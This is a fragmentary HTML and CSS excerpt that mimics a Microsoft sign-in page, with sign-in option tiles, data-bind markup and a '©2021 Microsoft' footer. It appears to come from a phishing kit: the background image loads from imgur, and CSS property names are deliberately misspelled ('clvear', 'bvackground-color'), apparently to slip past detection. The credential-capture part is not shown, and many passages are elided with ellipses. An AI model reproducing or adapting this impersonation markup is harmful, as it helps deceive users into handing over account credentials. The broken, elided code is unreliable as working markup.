    ...
    <style type="text/css">
        ...
        *:after {
        ...
        .footer {
            ...
            align-content: end;
            clvear: both;
            bvackground-color: rgba(0, 0, 0, 0.6);
    ...
    <div>
        ...
        <div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }">
            <div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
                ...
                <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;https://i.imgur.com/9IK0AIy.jpg?x=a5dbd4393ff6a725c7e62b61df7e72f0&quot;);">
...
<!--signin option start-->
                ...
                <div class="promoted-fed-cred-content" data-bind="css: {
                    ...
                    <div class="row tile">
                        <div class="table inner" role="button" tabindex="0" data-bind="
...
<!-- /ko --><!-- /ko -->
     ...
     <div id="footer" class="footer default" role="contentinfo" data-bind="css: { }">
                    ...
                    event: {
                        ...
                        showDebugDetailsClick: footer_showDebugDetailsClick } }">
                                ...
                                <div id="footerLinks" class="footerNode text-secondary">
                                    ...
                                    <span id="ftrCopy" data-bind="html: svr.strCopyrightTxt">©2021 Microsoft</span>
